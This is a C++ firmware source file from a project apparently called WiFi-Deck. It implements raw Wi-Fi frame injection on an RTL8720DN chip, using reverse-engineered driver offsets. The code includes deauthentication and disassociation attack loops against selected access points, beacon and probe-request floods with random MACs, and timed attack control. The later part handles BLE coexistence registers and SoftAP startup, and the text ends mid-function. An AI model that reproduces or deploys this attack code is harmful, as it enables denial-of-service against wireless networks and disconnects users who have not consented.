/*
 * wifi_attack.cpp — Frame injection, attack orchestration & radio management
 * Part of WiFi-Deck multi-file refactor.
 */

#include "web.h"
#include "wifi_attack.h"
#include "config.h"
#include "sniff.h"
#include "wifi_scan.h"
#include "utils.h"
#include "ble.h"
#include "command.h"

#include <Arduino.h>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "platform_stdlib.h"
#include "osdep_service.h"
#include "wiring_watchdog.h"

extern "C" {
#include "bt_intf.h"
extern uint8_t *pcoex;
void dhcps_deinit(void);
void hal_coex_init(void *padapter);
void rtw_coex_run_enable(void *padapter, uint8_t enable);
void rtw_coex_run(void *padapter);
void rtl8721d_set_coex_table(void *padapter, uint32_t val0x6c0, uint32_t val0x6c4, uint32_t val0x6c8, uint32_t val0x6cc);
void rtl8721d_set_pstdma_cmd(void *padapter, uint8_t b1, uint8_t b2, uint8_t b3, uint8_t b4, uint8_t b5);
uint8_t rtw_read8(void *padapter, uint32_t addr);
int rtw_write8(void *padapter, uint32_t addr, uint8_t val);
uint32_t rtw_read32(void *padapter, uint32_t addr);
int rtw_write32(void *padapter, uint32_t addr, uint32_t val);
}

static unsigned long continuous5GHzSinceMs = 0;
static unsigned long lastBleWindowStatusMs = 0;

//==========================================================
// Reason Code Definitions
//==========================================================
const uint16_t deauth_reasons[] = {1, 2, 4, 6, 7};
const uint16_t disassoc_reasons[] = {1, 2, 3, 8};
const uint8_t num_deauth_reasons = sizeof(deauth_reasons) / sizeof(deauth_reasons[0]);
const uint8_t num_disassoc_reasons = sizeof(disassoc_reasons) / sizeof(disassoc_reasons[0]);

//==========================================================
// Disassociation Attack State Definitions
//==========================================================
bool disassoc_enabled           = false;
unsigned long disassoc_interval = 1000;
unsigned long last_disassoc_attack = 0;

//==========================================================
// Raw Frame Injection
//==========================================================
void wifi_tx_raw_frame(void* frame, size_t length) {
  if (frame == NULL || length == 0 || length > 1500) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Invalid raw frame or length!");
    return;
  }
  if (!wifi_is_up(RTW_STA_INTERFACE) && !wifi_is_up(RTW_AP_INTERFACE)) {
    tx_fail_count++;
    Serial.println("[TX ERROR] Wi-Fi interface is not up!");
    return;
  }
  uint8_t *wlan_dev = rltk_wlan_info[0].dev;
  if (wlan_dev == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info dev is NULL!");
    return;
  }
  uint32_t **priv_slot = (uint32_t **)(wlan_dev + 0x10);
  uint32_t *priv_ptr = *priv_slot;
  if (priv_ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info priv_ptr is NULL!");
    return;
  }
  void *ptr = (void *)(*priv_ptr);
  if (ptr == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] rltk_wlan_info ptr is NULL!");
    return;
  }

  uint8_t *pxmitpriv = (uint8_t *)ptr + 0xae0;
  void *frame_control = alloc_mgtxmitframe(pxmitpriv);
  if (frame_control == NULL) {
    tx_fail_count++;
    Serial.println("[TX ERROR] alloc_mgtxmitframe returned NULL!");
    return;
  }

  // 先对底层 xmitbuf 指针判空再 memset / +0x28 偏移，失败时释放已分配资源避免泄漏
  uint8_t *frame_buf = *(uint8_t **)((uint8_t *)frame_control + 0x80);
  if (frame_buf == NULL) {
    tx_fail_count++;
    void *pxmitbuf = *(void **)((uint8_t *)frame_control + 0x84);
    if (pxmitbuf != NULL) {
      rtw_free_xmitbuf(pxmitpriv, pxmitbuf);
    }
    rtw_free_xmitframe(pxmitpriv, frame_control);
    Serial.println("[TX ERROR] frame_buf is NULL!");
    return;
  }

  update_mgntframe_attrib(ptr, (uint8_t *)frame_control + 8);
  memset(frame_buf, 0, 0x68);
  uint8_t *frame_data = frame_buf + 0x28;
  memcpy(frame_data, frame, length);
  *(uint32_t *)((uint8_t *)frame_control + 0x14) = (uint32_t)length;
  *(uint32_t *)((uint8_t *)frame_control + 0x18) = (uint32_t)length;
  int ret = dump_mgntframe(ptr, frame_control);
  if (ret == 0) {
    tx_success_count++;
  } else {
    tx_fail_count++;
    Serial.print("[TX ERROR] dump_mgntframe returned: ");
    Serial.println(ret);
  }
}

void wifi_tx_deauth_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(const void* src_mac, const void* dst_mac, uint16_t reason) {
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  // Rotate sequence number (increment by 1 per frame, fragment=0)
  frame.sequence_number = (seq_num_counter++ << 4) & 0xFFF0;
  wifi_tx_raw_frame((void*)&frame, sizeof(DisassocFrame));
}

//==========================================================
// Beacon Flood TX
//==========================================================
void wifi_tx_beacon_frame(const char* ssid, int ssid_len, uint8_t channel) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x80; buf[offset++] = 0x00;    // FC = Beacon
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memcpy(&buf[offset], &buf[offset - 6], 6); offset += 6;  // BSSID = SA
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  unsigned long ts = millis();
  memcpy(&buf[offset], &ts, 4); offset += 8;      // timestamp (low 4B, high 4B zero)
  buf[offset++] = 0x64; buf[offset++] = 0x00;    // beacon interval = 100 TUs
  buf[offset++] = 0x01; buf[offset++] = 0x00;    // capability = ESS

  const int tailLen = (channel >= 36) ? 10 : 9;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (channel >= 36) {
    // 5GHz 802.11a/n OFDM Supported Rates (6, 9, 12, 18, 24, 36, 48, 54 Mbps)
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x03; buf[offset++] = 0x01; buf[offset++] = channel;  // 2.4GHz DS params
    // 2.4GHz 802.11b/g Supported Rates (1, 2, 5.5, 11 Mbps)
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

//==========================================================
// Probe Request Flood TX
//==========================================================
void wifi_tx_probe_req_frame(const char* ssid, int ssid_len) {
  if (!ssid || ssid_len < 0) return;
  int safeLen = (ssid_len > 32) ? 32 : ssid_len;
  int chSnap = getCurrentChannelSafe();

  uint8_t buf[96];
  memset(buf, 0, sizeof(buf));
  int offset = 0;

  buf[offset++] = 0x40; buf[offset++] = 0x00;    // FC = Probe Request
  offset += 2;                                    // duration = 0
  memset(&buf[offset], 0xFF, 6); offset += 6;    // DA = broadcast
  randomMAC(&buf[offset]); offset += 6;          // SA = random
  memset(&buf[offset], 0xFF, 6); offset += 6;    // BSSID = broadcast
  uint16_t seq = (seq_num_counter++ << 4) & 0xFFF0;
  buf[offset++] = seq & 0xFF; buf[offset++] = (seq >> 8) & 0xFF;

  const int tailLen = (chSnap >= 36) ? 10 : 6;
  if (offset + 2 + safeLen + tailLen > (int)sizeof(buf)) return;

  buf[offset++] = 0x00;                           // SSID tag
  buf[offset++] = (uint8_t)safeLen;
  if (safeLen > 0) {
    memcpy(&buf[offset], ssid, (size_t)safeLen);
    offset += safeLen;
  }
  if (chSnap >= 36) {
    const uint8_t rates5g[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
    buf[offset++] = 0x01; buf[offset++] = sizeof(rates5g);
    memcpy(&buf[offset], rates5g, sizeof(rates5g));
    offset += sizeof(rates5g);
  } else {
    buf[offset++] = 0x01; buf[offset++] = 0x04;
    buf[offset++] = 0x82; buf[offset++] = 0x84;
    buf[offset++] = 0x8B; buf[offset++] = 0x96;
  }

  wifi_tx_raw_frame(buf, (size_t)offset);
}

//==========================================================
// Timed Attack
//==========================================================
void startTimedAttack(unsigned long durationMs) {
  timedAttackEnabled = true;
  attackStartTime    = millis();
  attackDuration     = durationMs;
  attack_enabled     = true;
}

void checkTimedAttack() {
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    attack_enabled     = false;
    timedAttackEnabled = false;
    blePushStatus();
    Serial.println("[INFO] Timed attack ended.");
  }
  bool sniffNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffNow = isSniffing;
  rtw_exit_critical(NULL, NULL);
  if (timedSniffEnabled && sniffNow && (millis() - sniffStartTime > sniffDuration)) {
    timedSniffEnabled = false;
    stopSniffing();
    blePushStatus();
    Serial.println("[INFO] Timed sniff ended.");
  }
}

bool shouldAbortCycle() {
  feedWatchdog();
  if (timedAttackEnabled && (millis() - attackStartTime > attackDuration)) {
    return true;
  }
  pollSerialInput();
  if (emergencyStopRequested || priorityStopPending) {
    return true;
  }
  if (hasQueuedStopInCmdRing()) {
    emergencyStopRequested = true;
    return true;
  }
  return false;
}

//==========================================================
// Stop All Active Attacks
//==========================================================
void stopAllActiveAttacks() {
  attack_enabled = false;
  disassoc_enabled = false;
  timedAttackEnabled = false;
  scan_enabled = false;
  beacon_flood_enabled = false;
  probe_flood_enabled = false;
  signal_jam_enabled = false;
  deauthSlice.reset();
  disassocSlice.reset();
  if (USE_LED) digitalWrite(LED_B, LOW);
}

void stopConflictingModesBeforeAttack() {
  stopAllActiveAttacks();
  bool sniffActive = false;
  rtw_enter_critical(NULL, NULL);
  sniffActive = (isSniffing || deauth_sniff_enabled);
  rtw_exit_critical(NULL, NULL);
  if (sniffActive) {
    stopSniffing();
  }
}

//==========================================================
// Sliced Non-blocking TX Cycle
//==========================================================
bool stepSlicedTxCycle(SlicedTxCycle &st, bool sendDeauth, bool sendDisassoc, unsigned long frameBudgetPerTick) {
  if (!st.active) return false;
  if (frameBudgetPerTick == 0) frameBudgetPerTick = 8;

  auto abortNow = [&]() -> bool {
    if (shouldAbortCycle()) return true;
    if (sendDeauth && !attack_enabled) return true;
    if (!sendDeauth && sendDisassoc && !disassoc_enabled) return true;
    return false;
  };

  if (abortNow()) {
    st.reset();
    restoreDefaultChannelIfNeeded(false);
    if (USE_LED) digitalWrite(LED_B, LOW);
    return false;
  }

  unsigned long sentThisTick = 0;
  while (st.active && sentThisTick < frameBudgetPerTick) {
    if (st.targetIdx >= st.targets.size()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }

    const WiFiScanResult &tgt = st.targets[st.targetIdx];
    if ((int)tgt.channel >= 36 &&
        isBleConnectedSafe() &&
        continuous5GHzSinceMs != 0 &&
        (millis() - continuous5GHzSinceMs >= 650UL)) {
      // Bound continuous 5GHz residency across multi-target 5GHz lists (st.frameIdx == 0)
      // and high-frame-count bursts (st.frameIdx > 0) so the shared RTL8720DN LO (RF_0x18)
      // returns to 2.4GHz CH 1 for BLE LL supervision anchors.
      serviceBleBreathingWindow(85UL, true);
      if (abortNow()) {
        st.reset();
        restoreDefaultChannelIfNeeded(false);
        if (USE_LED) digitalWrite(LED_B, LOW);
        return false;
      }
      if (st.frameIdx > 0 && wifi_set_channel(tgt.channel) == RTW_SUCCESS) {
        setCurrentChannelSafe((int)tgt.channel);
        refreshBleCoexOnBandSwitch(WIFI_CHANNEL, (int)tgt.channel);
      }
    }
    if (st.frameIdx == 0) {
      int prevCh = getCurrentChannelSafe();
      if (wifi_set_channel(tgt.channel) != RTW_SUCCESS) {
        Serial.print("[WARN] wifi_set_channel(");
        Serial.print(tgt.channel);
        Serial.println(") failed");
        st.targetIdx++;
        continue;
      }
      setCurrentChannelSafe((int)tgt.channel);
      refreshBleCoexOnBandSwitch(prevCh, (int)tgt.channel);
    }

    if (st.frameIdx >= num_send_frames) {
      st.frameIdx = 0;
      st.targetIdx++;
      continue;
    }

    if (abortNow()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }

    // 仅发 AP -> Broadcast 的有效帧；src==dst(BSSID->BSSID) 会被 AP 硬件当作回环丢弃
    if (sendDeauth) {
      wifi_tx_deauth_frame(tgt.bssid, dst_mac, deauth_reasons[st.frameIdx % num_deauth_reasons]);
    }
    if (sendDisassoc) {
      wifi_tx_disassoc_frame(tgt.bssid, dst_mac, disassoc_reasons[st.frameIdx % num_disassoc_reasons]);
    }

    st.frameIdx++;
    sentThisTick++;

    bool hasMoreInTarget = (st.frameIdx < num_send_frames);
    if (!hasMoreInTarget) {
      st.frameIdx = 0;
      st.targetIdx++;
    }
    if (st.targetIdx >= st.targets.size()) {
      st.reset();
      restoreDefaultChannelIfNeeded(false);
      if (USE_LED) digitalWrite(LED_B, LOW);
      return false;
    }
    if (sentThisTick < frameBudgetPerTick) {
      delay(1);
    }
  }
  return st.active;
}

//==========================================================
// Target Attack
//==========================================================
void targetAttack() {
  std::vector<WiFiScanResult> targets;
  bool isTargetMode = false;
  if (lockScanMutex()) {
    isTargetMode = target_mode;
    if (isTargetMode) {
      targets = target_aps;
    }
    unlockScanMutex();
  }
  if (isTargetMode && !targets.empty() && attack_enabled) {
    deauthSlice.reset();
    deauthSlice.targets = targets;
    deauthSlice.active = true;
    if (USE_LED) digitalWrite(LED_B, HIGH);
    while (stepSlicedTxCycle(deauthSlice, true, true, 8)) {
      feedWatchdog();
    }
  }
}

//==========================================================
// Radio Management — BLE Coexistence
//==========================================================
// Forward declaration for BLE started flag (defined in BLE module / main .ino)
extern volatile bool bleStarted;

static void *getActiveWlanAdapter() {
  if (rltk_wlan_info[0].enable == 0) {
    return nullptr;
  }
  uint8_t *wlanDev = rltk_wlan_info[0].dev;
  if (wlanDev == nullptr) {
    return nullptr;
  }
  void **privSlot = reinterpret_cast<void **>(wlanDev + 0x10);
  void *privPtr = *privSlot;
  if (privPtr == nullptr) {
    return nullptr;
  }
  return *reinterpret_cast<void **>(privPtr);
}

struct CoexMutexGuard {
  _mutex *mtx = nullptr;
  bool locked = false;

  bool tryLock(uint32_t timeoutMs = 50U) {
    if (pcoex == nullptr || pcoex[0] == 0U) return false;
    _mutex *slot = reinterpret_cast<_mutex *>(pcoex + 8);
    if (*slot == NULL) return false;
    if (rtw_mutex_get_timeout(slot, timeoutMs) >= 0) {
      mtx = slot;
      locked = true;
      return true;
    }
    return false;
  }

  void unlock() {
    if (locked && mtx != nullptr) {
      rtw_mutex_put(mtx);
      locked = false;
      mtx = nullptr;
    }
  }

  ~CoexMutexGuard() { unlock(); }
};

void enforceBleCoexPta(bool forceBlePriorityTable) {
  if (!bleStarted) return;
  if (!wifi_is_up(RTW_STA_INTERFACE) && !wifi_is_up(RTW_AP_INTERFACE)) {
    return;
  }
  void *padapter = getActiveWlanAdapter();
  if (padapter == nullptr) return;

  // Serialize with lib_wlan's rtw_coex_run() (0x0e0241c4) via [pcoex + 8] mutex to avoid racing
  // cmd_thread / rtw_coex_mailbox_thread / survey_timer_hdl on pcoex, pbtcoex[0], 0x778, 0x6c0..6c8.
  CoexMutexGuard coexGuard;
  if (pcoex != nullptr && pcoex[0] != 0U) {
    if (!coexGuard.tryLock(50U)) {
      return;
    }
  }

  // 1) Synchronize lib_wlan pcoex state:
  //    - Keep prev_wifi_state (pcoex[2]) aligned with current mode (6=SoftAP, 1=STA) so
  //      report_surveydone_event -> rtw_coex_wifi_info_update(padapter, 3) always restores it.
  //    - Sanitize bt_state (pcoex[3]) to 2 when BLE is connected or 1 when advertising, clearing
  //      any stuck bit 3 (0x08 from mailbox 0x45 -> Case 8) or stale 1/4 that breaks coex_case 0x0202
  //      in rtl8721d_btcoex_wifi_tdma_scan_start / rtl8721d_btcoex_wifi_tdma_scan_set_slot.
  bool bleConn = isBleConnectedSafe();
  uint8_t desiredBtState = bleConn ? 2U : 1U;
  uint8_t baseWifiState = softApActive ? 6U : 1U;
  bool inActiveSurvey = false;
  if (pcoex != nullptr) {
    pcoex[2] = baseWifiState;
    if (pcoex[1] == 2U) {
      inActiveSurvey = true;
    } else if (pcoex[1] != baseWifiState) {
      pcoex[1] = baseWifiState;
    }
    if (pcoex[3] != desiredBtState) {
      pcoex[3] = desiredBtState;
    }
    *reinterpret_cast<uint16_t *>(pcoex + 4) =
        static_cast<uint16_t>((static_cast<uint16_t>(pcoex[1]) << 8) | pcoex[3]);
    if (!inActiveSurvey && pcoex[12] != 0U) {
      pcoex[12] = 0U;
    }
  }

  // 2) Ensure hardware PTA pad/mux & arbitration are enabled (0x70[31:24]=0xCA, 0x74 BIT16 = BIT_BT_PTA_EN)
  //    and clear any software-forced Wi-Fi-only GNT_BT override in 0x764[10:9].
  uint32_t reg70 = rtw_read32(padapter, 0x0070U);
  if ((reg70 & 0xFF000000U) != 0xCA000000U) {
    rtw_write32(padapter, 0x0070U, 0xCA000082U);
  }
  uint32_t reg74 = rtw_read32(padapter, 0x0074U);
  if ((reg74 & 0x00010000U) == 0U) {
    rtw_write32(padapter, 0x0074U, reg74 | 0x00010000U);
  }
  uint32_t reg764 = rtw_read32(padapter, 0x0764U);
  if ((reg764 & 0x00000600U) != 0U) {
    rtw_write32(padapter, 0x0764U, reg764 & ~0x00000600U);
  }

  // 3) Sanitize MAC 0x778 low nibble back to 0x01 (normal PTA table select) whenever not inside
  //    an active TDMA scan step (where rtl8721d_btcoex_wifi_tdma_scan_set_slot toggles 0x09/0x01)
  //    and not running SoftAP PS-TDMA Case 4 (where KM0 MCU toggles 0x778 dynamically).
  bool tdmaScanStepActive = (inActiveSurvey && pcoex != nullptr && pcoex[12] != 0U);
  if (!tdmaScanStepActive && (forceBlePriorityTable || !softApActive)) {
    uint8_t reg778 = rtw_read8(padapter, 0x0778U);
    if ((reg778 & 0x0FU) != 0x01U) {
      rtw_write8(padapter, 0x0778U, static_cast<uint8_t>((reg778 & 0xF0U) | 0x01U));
    }
  }

  // 4) Enforce Coex Table (0x6c0/0x6c4/0x6c8) & KM0 WLAN MCU PS-TDMA (H2C 0x60):
  //    - In unassociated STA / promiscuous sniff / breathing windows (forceBlePriorityTable || !softApActive),
  //      match Realtek Case 2 (0x0102) & Case 5 (0x0202):
  //      0x6c0=0x55555555, 0x6c4=0x55555555, 0x6c8=0x0000FFFF (break table protecting BLE),
  //      and explicitly disable H2C 0x60 PS-TDMA (0,0,0,0,0) if pbtcoex->cur_pstdma_case was on
  //      Case 4 (0x61) or Case 8 (0x51).
  //    - In normal SoftAP mode with BLE connected (0x0602 -> Case 4), invalidate any non-Case-4
  //      cur_pstdma_case cache, release [pcoex+8] mutex, and re-run rtw_coex_run(padapter).
  uint32_t *pbtcoex = *reinterpret_cast<uint32_t **>(reinterpret_cast<uint8_t *>(padapter) + 0x207cU);
  bool needSoftApCoexRun = false;
  if (forceBlePriorityTable || !softApActive) {
    if (rtw_read32(padapter, 0x06c0U) != 0x55555555U ||
        rtw_read32(padapter, 0x06c4U) != 0x55555555U ||
        rtw_read32(padapter, 0x06c8U) != 0x0000FFFFU) {
      rtl8721d_set_coex_table(padapter, 0x55555555U, 0x55555555U, 0x0000FFFFU, 0U);
    }
    if (pbtcoex != nullptr && pbtcoex[0] != 2U && pbtcoex[0] != 5U) {
      rtl8721d_set_pstdma_cmd(padapter, 0U, 0U, 0U, 0U, 0U);
      pbtcoex[0] = inActiveSurvey ? 5U : 2U;
    }
  } else if (!inActiveSurvey && bleConn) {
    if (pbtcoex != nullptr && pbtcoex[0] != 4U) {
      pbtcoex[0] = 0xFFFFFFFFU;
      needSoftApCoexRun = true;
    }
  }
  coexGuard.unlock();
  if (needSoftApCoexRun) {
    rtw_coex_run(padapter);
  }
}

void restoreBleCoex(bool resetCoex) {
  if (!bleStarted) return;
  wifi_btcoex_set_bt_on();
  if (!wifi_is_up(RTW_STA_INTERFACE) && !wifi_is_up(RTW_AP_INTERFACE)) {
    return;
  }
  void *padapter = getActiveWlanAdapter();
  if (padapter == nullptr) return;

  // AmebaD 3.1.7 lib_wlan.a fix:
  // 1) Never call rltk_coex_bt_enable(0/1) here: bt_enable(0) frees pcoex (wiping wifi_state)
  //    and bt_enable(1) overwrites bt_state=2 (BLE connected) back to 1 and duplicates coex_mailbox.
  // 2) For hot wifi_set_mode() transitions (!resetCoex && pcoex->run_en == 1), synchronize pcoex
  //    under [pcoex+8] mutex without tearing down coex_run_enable or re-running hal_coex_init.
  // 3) For cold wifi_on() fallback (resetCoex == true), re-initialize hal_coex_init & rtw_coex_run_enable
  //    after netif is UP so btc_pta_init_8721d() succeeds, then apply rtw_coex_run() + enforceBleCoexPta().
  feedWatchdog();
  uint8_t baseWifiState = softApActive ? 6U : 1U;
  uint8_t desiredBtState = isBleConnectedSafe() ? 2U : 1U;
  bool coexAlreadyRunning = (!resetCoex && pcoex != nullptr && pcoex[0] != 0U);
  if (coexAlreadyRunning) {
    CoexMutexGuard coexGuard;
    coexGuard.tryLock(50U);
    pcoex[1] = baseWifiState;
    pcoex[2] = baseWifiState;
    pcoex[3] = desiredBtState;
    pcoex[12] = 0U;
    uint32_t *pbtcoex = *reinterpret_cast<uint32_t **>(reinterpret_cast<uint8_t *>(padapter) + 0x207cU);
    if (pbtcoex != nullptr) {
      pbtcoex[0] = 0xFFFFFFFFU;
    }
    coexGuard.unlock();
  } else {
    hal_coex_init(padapter);
    if (pcoex != nullptr) {
      pcoex[1] = baseWifiState;
      pcoex[2] = baseWifiState;
      pcoex[3] = desiredBtState;
      pcoex[12] = 0U;
    }
    if (resetCoex) {
      rtw_coex_run_enable(padapter, 0);
    }
    rtw_coex_run_enable(padapter, 1);
    uint32_t *pbtcoex = *reinterpret_cast<uint32_t **>(reinterpret_cast<uint8_t *>(padapter) + 0x207cU);
    if (pbtcoex != nullptr) {
      pbtcoex[0] = 0xFFFFFFFFU;
    }
  }
  rtw_coex_run(padapter);
  enforceBleCoexPta(!softApActive);
  feedWatchdog();
}

void refreshBleCoexOnBandSwitch(int prevCh, int newCh) {
  if (newCh >= 36) {
    if (prevCh < 36 || continuous5GHzSinceMs == 0) {
      continuous5GHzSinceMs = millis();
      if (continuous5GHzSinceMs == 0) continuous5GHzSinceMs = 1;
    }
  } else {
    continuous5GHzSinceMs = 0;
  }

  if (!bleStarted) return;
  if (!wifi_is_up(RTW_STA_INTERFACE) && !wifi_is_up(RTW_AP_INTERFACE)) return;
  void *padapter = getActiveWlanAdapter();
  if (padapter != nullptr && ((prevCh >= 36) != (newCh >= 36))) {
    rtw_coex_run(padapter);
  }
  if (newCh < 36) {
    enforceBleCoexPta(!softApActive);
  }
}

void serviceBleBreathingWindow(unsigned long windowMs, bool parkOn2G) {
  feedWatchdog();
  pollSerialInput();
  if (!bleStarted && !softApActive) {
    return;
  }

  int prevCh = getCurrentChannelSafe();
  if (parkOn2G) {
    // Always re-assert WIFI_CHANNEL (CH 1) in hardware when parkOn2G is requested:
    // lib_wlan's site_survey switches RF channels directly without updating currentChannel,
    // so checking prevCh != WIFI_CHANNEL alone could skip retuning RF_0x18 back to 2.4GHz.
    if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
      setCurrentChannelSafe(WIFI_CHANNEL);
      continuous5GHzSinceMs = 0;
    }
  } else if (prevCh < 36) {
    continuous5GHzSinceMs = 0;
  }

  enforceBleCoexPta(true);

  unsigned long startMs = millis();
  while (true) {
    feedWatchdog();
    pollSerialInput();
    processBleDiagAndNegotiation();

    unsigned long nowMs = millis();
    if (nowMs - lastBleWindowStatusMs >= 1000UL) {
      lastBleWindowStatusMs = nowMs;
      blePushStatus(false);
    }

    if (emergencyStopRequested || priorityStopPending || hasQueuedStopInCmdRing()) {
      break;
    }
    unsigned long elapsed = nowMs - startMs;
    if (elapsed >= windowMs) {
      break;
    }
    unsigned long stepMs = windowMs - elapsed;
    if (stepMs > 10UL) stepMs = 10UL;
    delay(stepMs);
  }

  if (softApActive) {
    void *padapter = getActiveWlanAdapter();
    if (padapter != nullptr) {
      rtw_coex_run(padapter);
    }
    enforceBleCoexPta(false);
  } else {
    enforceBleCoexPta(true);
  }
}

void maintainBle5GHzKeepalive() {
  static unsigned long last2GCoexGuardMs = 0;
  unsigned long nowMs = millis();
  int curCh = getCurrentChannelSafe();
  if (curCh < 36) {
    continuous5GHzSinceMs = 0;
    // Periodically self-heal 2.4GHz PTA registers (0x6c0/0x6c4=0x55555555, 0x778=0x01)
    // in case asynchronous rtw_coex_mailbox_thread or delayed survey events ran rtw_coex_run().
    if (bleStarted && (nowMs - last2GCoexGuardMs >= 500UL)) {
      last2GCoexGuardMs = nowMs;
      enforceBleCoexPta(!softApActive);
    }
    return;
  }
  if (!bleStarted) {
    continuous5GHzSinceMs = (nowMs != 0) ? nowMs : 1UL;
    return;
  }
  if (continuous5GHzSinceMs == 0) {
    continuous5GHzSinceMs = (nowMs != 0) ? nowMs : 1UL;
    return;
  }
  bool bleConn = isBleConnectedSafe();
  unsigned long max5GResidencyMs = bleConn ? 800UL : 1200UL;
  if (nowMs - continuous5GHzSinceMs < max5GResidencyMs) {
    return;
  }

  // RTL8720DN shares a single RF PLL (RF_0x18) between 5GHz Wi-Fi and 2.4GHz BLE.
  // When locked onto CH 36-165 (e.g. single-channel 5GHz sniff, 5GHz flood, or idle CH lock
  // under 'ap off'), periodically park on 2.4GHz CH 1 for 75-85ms (~2 BLE connection/advertising
  // intervals) while muting promiscuous RX so 2.4GHz frames never contaminate 5GHz capture logs.
  rtw_enter_critical(NULL, NULL);
  promiscPauseForBleCoex = true;
  rtw_exit_critical(NULL, NULL);

  bool parked = (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS);
  if (parked) {
    serviceBleBreathingWindow(bleConn ? 75UL : 85UL, false);
    if (!emergencyStopRequested && !priorityStopPending &&
        wifi_set_channel(curCh) == RTW_SUCCESS) {
      unsigned long resumedAt = millis();
      continuous5GHzSinceMs = (resumedAt != 0) ? resumedAt : 1UL;
    } else {
      setCurrentChannelSafe(WIFI_CHANNEL);
      continuous5GHzSinceMs = 0;
    }
  }

  rtw_enter_critical(NULL, NULL);
  promiscPauseForBleCoex = false;
  rtw_exit_critical(NULL, NULL);
}

//==========================================================
// Radio Management — Channel Restore
//==========================================================
void restoreDefaultChannelIfNeeded(bool force) {
  bool sniffingNow = false;
  rtw_enter_critical(NULL, NULL);
  sniffingNow = isSniffing;
  rtw_exit_critical(NULL, NULL);

  int prevCh = getCurrentChannelSafe();
  bool strandedOn5GWithBle = (!sniffingNow && prevCh >= 36 && isBleConnectedSafe());
  if (force || apEnabled || softApActive || strandedOn5GWithBle) {
    if (wifi_set_channel(WIFI_CHANNEL) == RTW_SUCCESS) {
      setCurrentChannelSafe(WIFI_CHANNEL);
      refreshBleCoexOnBandSwitch(prevCh, WIFI_CHANNEL);
    }
  }
}

//==========================================================
// Radio Management — SoftAP Health Check
//==========================================================
bool isSoftApHealthy() {
  int wextMode = -1;
  return (wlanRuntimeMode == WLAN_MODE_AP &&
          softApActive &&
          wifi_is_up(RTW_AP_INTERFACE) &&
          wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
          wextMode == RTW_MODE_MASTER);
}

//==========================================================
// Radio Management — Start SoftAP
//==========================================================
bool startSoftAP() {
  // Close any previous listening socket before tearing down WLAN to prevent lwIP socket leak
  stopWebServer();
  softApActive = false;
  apEnabled = true;
  feedWatchdog();

  char ch[4];
  snprintf(ch, sizeof(ch), "%d", WIFI_CHANNEL);

  for (uint8_t attempt = 0; attempt < 2; attempt++) {
    if (attempt > 0) {
      Serial.println("[WARN] startSoftAP: retrying AP + WebServer recovery...");
    }
    bool didColdWifiReset = false;
    // 优先使用 SDK 原生 wifi_set_mode(RTW_MODE_AP) 热切模式，避免 wifi_off()/wifi_on()
    // 触发 rtl8721d_hal_deinit/hal_init + ex_hal8721d_wifi_only_hw_config 破坏运行中的 BLE RF/PTA。
    if (wlanLwipInitialized) {
      bool hotSwitchOk = false;
      if (attempt == 0 && (wifi_is_up(RTW_STA_INTERFACE) || wifi_is_up(RTW_AP_INTERFACE))) {
        dhcps_deinit();
        feedWatchdog();
        if (wifi_set_mode(RTW_MODE_AP) == RTW_SUCCESS) {
          hotSwitchOk = true;
          feedWatchdog();
        } else {
          Serial.println("[WARN] startSoftAP: wifi_set_mode(RTW_MODE_AP) failed; falling back to cold restart.");
        }
      }
      if (!hotSwitchOk) {
        wifi_off();
        feedWatchdog();
        delay(40);
        if (wifi_on(RTW_MODE_AP) != RTW_SUCCESS) {
          wlanRuntimeMode = WLAN_MODE_UNINIT;
          Serial.println("[ERROR] startSoftAP: wifi_on(RTW_MODE_AP) failed");
          continue;
        }
        delay(20);
        feedWatchdog();
        didColdWifiReset = true;
      }
    } else if (wlanRuntimeMode != WLAN_MODE_UNINIT) {
      wifi_off();
